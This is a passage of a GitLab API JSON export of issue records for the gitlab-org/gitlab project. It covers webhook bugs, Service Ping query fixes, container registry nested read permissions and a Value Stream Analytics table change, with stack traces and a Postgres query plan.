Doskich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11982352/avatar.png","web_url":"https://gitlab.com/krisberry-ext"},"user_notes_count":10,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353583","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353583","notes":"https://gitlab.com/api/v4/projects/278964/issues/353583/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353583/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353583","relative":"#353583","full":"gitlab-org/gitlab#353583"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3050,"epic":{"id":39430,"iid":3050,"title":"🐞 GitHub Importer bugs","url":"/groups/gitlab-org/-/epics/3050","group_id":9970},"iteration":null,"health_status":null},{"id":102933472,"iid":353567,"project_id":278964,"title":"Cannot test webhook with pipeline data","description":"https://sentry.gitlab.net/gitlab/gitlabcom/issues/3197369/?referrer=gitlab_plugin\n\n```\nActiveRecord::SerializationTypeMismatch: can't serialize `request_data`: was supposed to be a Hash, but was a Gitlab::DataBuilder::Pipeline. -- {:object_kind=\u003e\"pipeline\", :object_attributes=\u003e{:id=\u003e477384350, :ref=\u003e\"v1.1.0\", :tag=\u003etrue, :sha=\u003e\"746c12c11a9af8333117354e556424c02286075b\", :before_sha=\u003e\"0000000000000000000000000000000000000000\", :source=\u003e\"push\", :status=\u003e\"success\", :detailed_status=\u003e\"passed\", :stages=\u003e[\"build\"], :created_at=\u003eWed, 23 Feb 2022 08:03:34.986497000 UTC +00:00, :finished_at=\u003eWed, 23 Feb 2022 08:21:25.485373000 UTC +00:00, :duration=\u003e542, :queued_duration=\u003e257, :variables=\u003e[]}, :merge_request=\u003enil, :user=\u003e{:id=\u003e6529578, :name=\u003e\"Utt Assoratgoon\", :username=\u003e\"utta1\", :avatar_url=\u003e\"https://gitlab.com/uploads/-/system/user/avatar/6529578/avatar.png\", :email=\u003e\"[REDACTED]\"}, :project=\u003e{:id=\u003e30998080, :name=\u003e\"Blink Detector zenML\", :description=\u003e\"Blink Detector Serving with zenML backend\", :web_url=\u003e\"https://gitlab.com/sertiscorp/projects/cv-platform/models/blink-detector-zenml\", :avatar_url=\u003enil, :git_ssh_url=\u003e\"git@gitlab.com:sertiscorp/projects/cv-platform/models/blink-detector-zenml.git\", :git_http_url=\u003e\"https://gitlab.com/sertiscorp/projects/cv-platform/models/blink-detector-zenml.git\", :namespace=\u003e\"Models\", :visibility_level=\u003e0, :path_with_namespace=\u003e\"sertiscorp/projects/cv-platform/models/blink-detector-zenml\", :default_branch=\u003e\"develop\", :ci_config_path=\u003e\"\"}, :commit=\u003e{:id=\u003e\"746c12c11a9af8333117354e556424c02286075b\", :message=\u003e\"Merge branch 'develop' into 'main'\\n\\nDevelop\\n\\nSee merge request sertiscorp/projects/cv-platform/models/blink-detector-zenml!5\", :title=\u003e\"Merge branch 'develop' into 'main'\", :timestamp=\u003e\"2022-02-23T03:47:10+00:00\", :url=\u003e\"https://gitlab.com/sertiscorp/projects/cv-platform/models/blink-detector-zenml/-/commit/746c12c11a9af8333117354e556424c02286075b\", :author=\u003e{:name=\u003e\"Utt Assoratgoon\", :email=\u003e\"utta@sertiscorp.com\"}}, :builds=\u003e[{:id=\u003e2126199413, :stage=\u003e\"build\", :name=\u003e\"build-push-prod\", :status=\u003e\"success\", :created_at=\u003eWed, 23 Feb 2022 08:03:35.019206000 UTC +00:00, :started_at=\u003eWed, 23 Feb 2022 08:07:51.989323000 UTC +00:00, :finished_at=\u003eWed, 23 Feb 2022 08:12:06.856864000 UTC +00:00, :duration=\u003e254.867541, :queued_duration=\u003e256.834054, :when=\u003e\"on_success\", :manual=\u003efalse, :allow_failure=\u003efalse, :user=\u003e{:id=\u003e6529578, :name=\u003e\"Utt Assoratgoon\", :username=\u003e\"utta1\", :avatar_url=\u003e\"https://gitlab.com/uploads/-/system/user/avatar/6529578/avatar.png\", :email=\u003e\"[REDACTED]\"}, :runner=\u003e{:id=\u003e2455505, :description=\u003e\"gitlab-runner\", :runner_type=\u003e\"group_type\", :active=\u003etrue, :is_shared=\u003efalse, :tags=\u003e[\"private-runner\"]}, :artifacts_file=\u003e{:filename=\u003enil, :size=\u003enil}, :environment=\u003enil}, {:id=\u003e2126199414, :stage=\u003e\"build\", :name=\u003e\"build-push-gitlab-latest\", :status=\u003e\"success\", :created_at=\u003eWed, 23 Feb 2022 08:03:35.037178000 UTC +00:00, :started_at=\u003eWed, 23 Feb 2022 08:16:37.362832000 UTC +00:00, :finished_at=\u003eWed, 23 Feb 2022 08:21:25.411669000 UTC +00:00, :duration=\u003e288.048837, :queued_duration=\u003e782.14597, :when=\u003e\"on_success\", :manual=\u003efalse, :allow_failure=\u003efalse, :user=\u003e{:id=\u003e6529578, :name=\u003e\"Utt Assoratgoon\", :username=\u003e\"utta1\", :avatar_url=\u003e\"https://gitlab.com/uploads/-/system/user/avatar/6529578/avatar.png\", :email=\u003e\"[REDACTED]\"}, :runner=\u003e{:id=\u003e2455505, :description=\u003e\"gitlab-runner\", :runner_type=\u003e\"group_type\", :active=\u003etrue, :is_shared=\u003efalse, :tags=\u003e[\"private-runner\"]}, :artifacts_file=\u003e{:filename=\u003enil, :size=\u003enil}, :environment=\u003enil}]}\n  app/services/web_hooks/log_execution_service.rb:21:in `log_execution'\n    WebHookLog.create!(web_hook: hook, **log_data.transform_keys(\u0026:to_sym))\n  app/services/web_hooks/log_execution_service.rb:15:in `execute'\n    log_execution\n  app/services/web_hook_service.rb:157:in `log_execution'\n    ::WebHooks::LogExecutionService.new(hook: hook, log_data: log_data, response_category: category).execute\n  app/services/web_hook_service.rb:72:in `execute'\n    log_execution(\n  app/models/hooks/web_hook.rb:55:in `execute'\n    WebHookService.new(self, data, hook_name, force: force).execute\n...\n(169 additional frame(s) were not displayed)\n```","state":"closed","created_at":"2022-02-23T14:38:46.449Z","updated_at":"2022-11-24T18:21:55.975Z","closed_at":"2022-03-22T16:43:11.122Z","closed_by":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"labels":["Category:Webhooks","backend","devops::manage","group::integrations","section::dev","type::bug","workflow::in review"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"}],"author":{"id":402401,"username":"jobbot","name":"Bot","state":"active","avatar_url":"https://secure.gravatar.com/avatar/aaa6738f1ebf25404010884af511b0e7?s=80\u0026d=identicon","web_url":"https://gitlab.com/jobbot"},"type":"ISSUE","assignee":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"user_notes_count":23,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353567","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353567","notes":"https://gitlab.com/api/v4/projects/278964/issues/353567/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353567/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353567","relative":"#353567","full":"gitlab-org/gitlab#353567"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6004,"epic":{"id":270610,"iid":6004,"title":"Improve the reliability of webhooks","url":"/groups/gitlab-org/-/epics/6004","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":null},{"id":102932437,"iid":353563,"project_id":278964,"title":"Allow for URL parameters for bookmarking filtered result sets","description":"## Summary\n\nWe should allow users to create filters for https://metrics.gitlab.com/ using the URL for purposes of bookmarking filtered results. As a practical example, our [Service Data Usage Policy](https://about.gitlab.com/handbook/legal/privacy/services-usage-data/) links to the dictionary filtered by \"Category = Operational\" \n\n## Proposal\n\nFrom [slack](https://gitlab.slack.com/archives/CL3A7GFPF/p1645608022328139?thread_ts=1645580919.613439\u0026cid=CL3A7GFPF), Nicolas suggests we introduce a more generic parameter  with `metrics.gitlab.com?q={query}`","state":"closed","created_at":"2022-02-23T14:20:16.245Z","updated_at":"2022-04-18T07:03:03.442Z","closed_at":"2022-04-07T21:35:50.127Z","closed_by":{"id":5412956,"username":"agarciatesares","name":"Axel García","state":"active","avatar_url":"https://secure.gravatar.com/avatar/11d24c6151c640aa435f8de30a01f5b8?s=80\u0026d=identicon","web_url":"https://gitlab.com/agarciatesares"},"labels":["Category:Service Ping","Deliverable","auto updated","devops::growth","feature::enhancement","frontend","group::product intelligence","section::growth","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":5412956,"username":"agarciatesares","name":"Axel García","state":"active","avatar_url":"https://secure.gravatar.com/avatar/11d24c6151c640aa435f8de30a01f5b8?s=80\u0026d=identicon","web_url":"https://gitlab.com/agarciatesares"}],"author":{"id":2890431,"username":"amandarueda","name":"Amanda Rueda","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2890431/avatar.png","web_url":"https://gitlab.com/amandarueda"},"type":"ISSUE","assignee":{"id":5412956,"username":"agarciatesares","name":"Axel García","state":"active","avatar_url":"https://secure.gravatar.com/avatar/11d24c6151c640aa435f8de30a01f5b8?s=80\u0026d=identicon","web_url":"https://gitlab.com/agarciatesares"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353563","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353563","notes":"https://gitlab.com/api/v4/projects/278964/issues/353563/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353563/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353563","relative":"#353563","full":"gitlab-org/gitlab#353563"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6522,"epic":{"id":321040,"iid":6522,"title":"Scalable Metrics Dictionary","url":"/groups/gitlab-org/-/epics/6522","group_id":9970,"human_readable_end_date":"Dec 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102930269,"iid":353559,"project_id":278964,"title":"Fix broken Service Ping metric queries","description":"## Background\n\nDuring work around https://gitlab.com/gitlab-org/gitlab/-/merge_requests/81002 it was identified that some of generated by https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/usage/service_ping_report.rb#L39 SQL queries used at https://docs.gitlab.com/ee/api/usage_data.html#export-service-ping-sql-queries have invalid SQL syntax\n\n## Goal \n\nFix failing queries for metrics\n\n```\n      [\"counts.labels\",\n       \"counts.jira_imports_total_imported_issues_count\",\n       \"counts.in_product_marketing_email_create_0_sent\",\n       \"counts.in_product_marketing_email_create_0_cta_clicked\",\n       \"counts.in_product_marketing_email_create_1_sent\",\n       \"counts.in_product_marketing_email_create_1_cta_clicked\",\n       \"counts.in_product_marketing_email_create_2_sent\",\n       \"counts.in_product_marketing_email_create_2_cta_clicked\",\n       \"counts.in_product_marketing_email_verify_0_sent\",\n       \"counts.in_product_marketing_email_verify_0_cta_clicked\",\n       \"counts.in_product_marketing_email_verify_1_sent\",\n       \"counts.in_product_marketing_email_verify_1_cta_clicked\",\n       \"counts.in_product_marketing_email_verify_2_sent\",\n       \"counts.in_product_marketing_email_verify_2_cta_clicked\",\n       \"counts.in_product_marketing_email_trial_0_sent\",\n       \"counts.in_product_marketing_email_trial_0_cta_clicked\",\n       \"counts.in_product_marketing_email_trial_1_sent\",\n       \"counts.in_product_marketing_email_trial_1_cta_clicked\",\n       \"counts.in_product_marketing_email_trial_2_sent\",\n       \"counts.in_product_marketing_email_trial_2_cta_clicked\",\n       \"counts.in_product_marketing_email_team_0_sent\",\n       \"counts.in_product_marketing_email_team_0_cta_clicked\",\n       \"counts.in_product_marketing_email_team_1_sent\",\n       \"counts.in_product_marketing_email_team_1_cta_clicked\",\n       \"counts.in_product_marketing_email_team_2_sent\",\n       \"counts.in_product_marketing_email_team_2_cta_clicked\",\n       \"counts.in_product_marketing_email_experience_0_sent\",\n       \"counts.in_product_marketing_email_team_short_0_sent\",\n       \"counts.in_product_marketing_email_team_short_0_cta_clicked\",\n       \"counts.in_product_marketing_email_trial_short_0_sent\",\n       \"counts.in_product_marketing_email_trial_short_0_cta_clicked\",\n       \"counts.in_product_marketing_email_admin_verify_0_sent\",\n       \"counts.in_product_marketing_email_admin_verify_0_cta_clicked\",\n       \"counts.ldap_users\",\n       \"usage_activity_by_stage.create.projects_with_sectional_code_owner_rules\",\n       \"usage_activity_by_stage.monitor.clusters_integrations_prometheus\",\n       \"usage_activity_by_stage.monitor.projects_with_enabled_alert_integrations_histogram\",\n       \"usage_activity_by_stage_monthly.create.projects_with_sectional_code_owner_rules\",\n       \"usage_activity_by_stage_monthly.monitor.clusters_integrations_prometheus\"]\n```","state":"closed","created_at":"2022-02-23T13:52:33.863Z","updated_at":"2022-05-17T06:15:28.236Z","closed_at":"2022-05-16T15:31:42.220Z","closed_by":{"id":11217480,"username":"tvellishetty","name":"Tarun Vellishetty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11217480/avatar.png","web_url":"https://gitlab.com/tvellishetty"},"labels":["Category:Service Ping","Data Warehouse::Impact Check","backend","devops::growth","group::product intelligence","priority::2","product intelligence::onboarding issue","section::growth","severity::3","type::bug","workflow::production"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":11217480,"username":"tvellishetty","name":"Tarun Vellishetty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11217480/avatar.png","web_url":"https://gitlab.com/tvellishetty"}],"author":{"id":4807002,"username":"mikolaj_wawrzyniak","name":"Mikołaj Wawrzyniak","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4807002/avatar.png","web_url":"https://gitlab.com/mikolaj_wawrzyniak"},"type":"ISSUE","assignee":{"id":11217480,"username":"tvellishetty","name":"Tarun Vellishetty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11217480/avatar.png","web_url":"https://gitlab.com/tvellishetty"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353559","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353559","notes":"https://gitlab.com/api/v4/projects/278964/issues/353559/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353559/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353559","relative":"#353559","full":"gitlab-org/gitlab#353559"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7451,"epic":{"id":428291,"iid":7451,"title":"Fix broken queries for Service Ping Automation in DWH","url":"/groups/gitlab-org/-/epics/7451","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102929521,"iid":353555,"project_id":278964,"title":"Update container registry auth service to support read permissions for nested repositories","description":"## Context\n\nWe are rolling out a new version of the Container Registry in GitLab.com that includes a metadata database (\u0026amp;5523). Among others, this database will allow for efficient storage usage calculations.\n\nThis issue is part of a work plan to expose the deduplicated size of grouped image repositories in the GitLab UI and API (https://gitlab.com/groups/gitlab-org/-/epics/7228).\n\nThe Container Registry has a new API, including [Get repository details](https://gitlab.com/gitlab-org/container-registry/-/blob/master/docs-gitlab/api.md#get-repository-details) operation. When used in conjunction with the `size=self_with_descendands` query parameter, the response will include the deduplicated size of the target repository and all repositories within. For example:\n\n```\ncurl --header \"Authorization: Bearer \u003ctoken\u003e\" \"https://registry.gitlab.com/gitlab/v1/repositories/gitlab-org/build/cng?size=self_with_descendants\"\n```\n\nThe request above will return the deduplicated size of all repositories within [`gitlab-org/build/cng`](https://gitlab.com/gitlab-org/build/CNG/container_registry). In this case, `cng` is a project, giving us the container registry usage at the project level. If we used `gitlab-org/build` for the query, that would give us the group level usage (deduplicated size of all image repositories across all projects under the `build` group). Finally, using `gitlab-org` would give us the top-level namespace usage (deduplicated size of all image repositories across all groups and projects under that namespace).\n\n## Problem\n\nThis new API operation is the first where we're targeting a series of repositories that only have one thing in common: their ancestor.\n\nThis means that we have to update the authentication service, so that it's possible to emit tokens that grant permission on a given repository and all repositories within.\n\nMore precisely, as documented [here](https://gitlab.com/gitlab-org/container-registry/-/blob/master/docs-gitlab/api.md#get-repository-details), when using `size=self_with_descendants`, `An auth token with pull permissions for name \u003cpath\u003e/* is required`. This part of the token will grant read access to all descendant repositories. The token also needs to have a `pull` access record for the base repository. So, to be able to make the sample request above, we need a token with the following format:\n\n```jsonc\n{\n  \"access\": [\n    {\n      \"actions\": [\n        \"pull\"\n      ],\n      \"name\": \"gitlab-org/build/cng\",\n      \"type\": \"repository\"\n    },\n    {\n      \"actions\": [\n        \"pull\"\n      ],\n      \"name\": \"gitlab-org/build/cng/*\",\n      \"type\": \"repository\"\n    }\n  ],\n  // ...\n}\n```\n\nThis is not possible right now.\n\n## Proposal\n\nImplement support for nested repository permissions. This _must_ be restricted to `pull` permissions.\n\nAdditionally, to start with, we should restrict this to the project level. This means that when a user requests `pull` permissions for `foo/bar/car/*`, we should make sure that:\n\n1. `foo/bar/car` is a project `OR` `foo/bar` is a project (and in that case, `car` is a sub-repository) `*`;\n1. The requesting user has registry read access for the target project.\n\nLater on, we'll have to expand this logic to account for group and top-level namespace permissions.\n\n`*` This requires some thought due to the max depth of groups/projects (what's the max depth here?) and sub container repositories (up to 3 levels deep).","state":"closed","created_at":"2022-02-23T13:38:43.607Z","updated_at":"2022-04-18T07:02:25.521Z","closed_at":"2022-03-31T10:47:24.338Z","closed_by":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"labels":["Category:Container Registry","Deliverable","Package:P1","authorization","backend","devops::package","group::package registry","package:active","ruby","section::ops","storage-management","type::feature","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"}],"author":{"id":5054840,"username":"jdrpereira","name":"João Pereira","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5054840/avatar.png","web_url":"https://gitlab.com/jdrpereira"},"type":"ISSUE","assignee":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"user_notes_count":12,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353555","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353555","notes":"https://gitlab.com/api/v4/projects/278964/issues/353555/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353555/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353555","relative":"#353555","full":"gitlab-org/gitlab#353555"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7228,"epic":{"id":401185,"iid":7228,"title":"Project-level storage usage visibility for the Container Registry","url":"/groups/gitlab-org/-/epics/7228","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102927049,"iid":353554,"project_id":278964,"title":"VSA: Add end event timestamp to table","description":"### Release notes\n\nSeveral enhancements have been made to the VSA stage table, including the addition of a column for the last workflow event. \n\n### Problem\n\nCurrently, the VSA table can only be sorted by [duration (time)](https://gitlab.com/gitlab-org/gitlab/-/issues/357824). There is no way clear option to sort by the date. users can't understand the sorting logic.\n\n### Proposal \n\n1. Remove the sorting option from the `title column`.\n1. Add an additional column called `Last event` to the VSA issues / MRs tables.\n1. That new column will `sort=end_event`.\n1. Tables default sorts by `end_event` (same as today).\n2. Both `project` and `group` VSA need that fix.","state":"closed","created_at":"2022-02-23T13:14:14.695Z","updated_at":"2022-06-21T12:02:48.284Z","closed_at":"2022-06-16T11:11:17.934Z","closed_by":{"id":4826728,"username":"m_frankiewicz","name":"Magdalena Frankiewicz","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ca314fa77051f58ced6e3e5bf7f0dd48?s=80\u0026d=identicon","web_url":"https://gitlab.com/m_frankiewicz"},"labels":["Deliverable","GitLab Premium","GitLab Ultimate","UX","auto updated","backend","backend-weight::1","devops::manage","documentation","frontend","frontend-weight::2","group::optimize","priority::2","release post item::in review","section::dev","type::maintenance","workflow::production"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":3397881,"username":"ekigbo","name":"Ezekiel Kigbo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3397881/avatar.png","web_url":"https://gitlab.com/ekigbo"}],"author":{"id":3101551,"username":"blabuschagne","name":"Brandon Labuschagne","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3101551/avatar.png","web_url":"https://gitlab.com/blabuschagne"},"type":"ISSUE","assignee":{"id":3397881,"username":"ekigbo","name":"Ezekiel Kigbo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3397881/avatar.png","web_url":"https://gitlab.com/ekigbo"},"user_notes_count":53,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353554","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353554","notes":"https://gitlab.com/api/v4/projects/278964/issues/353554/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353554/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353554","relative":"#353554","full":"gitlab-org/gitlab#353554"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7223,"epic":{"id":401117,"iid":7223,"title":"Value Stream Analytics ideas","url":"/groups/gitlab-org/-/epics/7223","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102926803,"iid":353553,"project_id":278964,"title":"Web hook edit page timeouts if associated web hook logs are very large","description":"Request fails with a 500 error message. \n\nThe logs show SQL timeout `PG::QueryCanceled: ERROR:  canceling statement due to statement timeout`\n\nBacktrace:\n\n```plaintext\nlib/gitlab/database/load_balancing/connection_proxy.rb:54:in `select_all'\napp/views/shared/hook_logs/_recent_deliveries_table.html.haml:26\n... # irrelevant: elided\nlib/gitlab/middleware/release_env.rb:13:in `call'\n```\n\nLogs in kibana: https://log.gprd.gitlab.net/goto/3b375a70-94a9-11ec-a649-b7cbb8e4f62e\n\nThe query is:\n\n```sql\n-- application:web,correlation_id:01FWKAG3CQNE8EF4JVDKDPYY5N,endpoint_id:Projects::HooksController#edit,db_config_name:main_replica\nSELECT COUNT(*) FROM \"web_hook_logs\" WHERE \"web_hook_logs\".\"web_hook_id\" = ? AND (created_at \u003e= ?)\n```\n\nI think we might need to review indices on the webhooks logs table, since we can see from the query plans below that there is no index on `web_hook_logs.created_at`.\n\nQuery plan:\n\n```plaintext\nAggregate  (cost=1264.76..1264.77 rows=1 width=8) (actual time=2.914..2.916 rows=1 loops=1)\n   Buffers: shared hit=12 read=4\n   I/O Timings: read=2.812 write=0.000\n   -\u003e  Append  (cost=0.57..1263.83 rows=371 width=0) (actual time=2.909..2.910 rows=0 loops=1)\n         Buffers: shared hit=12 read=4\n         I/O Timings: read=2.812 write=0.000\n         -\u003e  Index Scan using web_hook_logs_202202_web_hook_id_idx on gitlab_partitions_dynamic.web_hook_logs_202202  (cost=0.57..1242.99 rows=365 width=0) (actual time=2.845..2.846 rows=0 loops=1)\n               Index Cond: (web_hook_logs_202202.web_hook_id = 12345)\n               Filter: (web_hook_logs_202202.created_at \u003e= '2022-02-14 00:00:00'::timestamp without time zone)\n               Rows Removed by Filter: 0\n               Buffers: shared read=4\n               I/O Timings: read=2.812 write=0.000\n         -\u003e  Index Scan using web_hook_logs_202203_web_hook_id_idx on gitlab_partitions_dynamic.web_hook_logs_202203  (cost=0.14..3.17 rows=1 width=0) (actual time=0.018..0.018 rows=0 loops=1)\n               Index Cond: (web_hook_logs_202203.web_hook_id = 12345)\n               Filter: (web_hook_logs_202203.created_at \u003e= '2022-02-14 00:00:00'::timestamp without time zone)\n               Rows Removed by Filter: 0\n               Buffers: shared hit=2\n               I/O Timings: read=0.000 write=0.000\n         -\u003e  Index Scan using web_hook_logs_202204_web_hook_id_idx on gitlab_partitions_dynamic.web_hook_logs_202204  (cost=0.14..3.17 rows=1 width=0) (actual time=0.007..0.007 rows=0 loops=1)\n               Index Cond: (web_hook_logs_202204.web_hook_id = 12345)\n               Filter: (web_hook_logs_202204.created_at \u003e= '2022-02-14 00:00:00'::timestamp without time zone)\n               Rows Removed by Filter: 0\n               Buffers: shared hit=2\n               I/O Timings: read=0.000 write=0.000\n         -\u003e  Index Scan using web_hook_logs_202205_web_hook_id_idx on gitlab_partitions_dynamic.web_hook_logs_202205  (cost=0.14..3.17 rows=1 width=0) (actual time=0.013..0.013 rows=0 loops=1)\n               Index Cond: (web_hook_logs_202205.web_hook_id = 12345)\n               Filter: (web_hook_logs_202205.created_at \u003e= '2022-02-14 00:00:00'::timestamp without time zone)\n               Rows Removed by Filter: 0\n               Buffers: shared hit=2\n               I/O Timings: read=0.000 write=0.000\n         -\u003e  Index Scan using web_hook_logs_202206_web_hook_id_idx on gitlab_partitions_dynamic.web_hook_logs_202206  (cost=0.14..3.17 rows=1 width=0) (actual time=0.007..0.007 rows=0 loops=1)\n               Index Cond: (web_hook_logs_202206.web_hook_id = 12345)\n               Filter: (web_hook_logs_202206.created_at \u003e= '2022-02-14 00:00:00'::timestamp without time zone)\n               Rows Removed by Filter: 0\n               Buffers: shared hit=2\n               I/O Timings: read=0.000 write=0.000\n         -\u003e  Index Scan using web_hook_logs_202207_web_hook_id_idx on 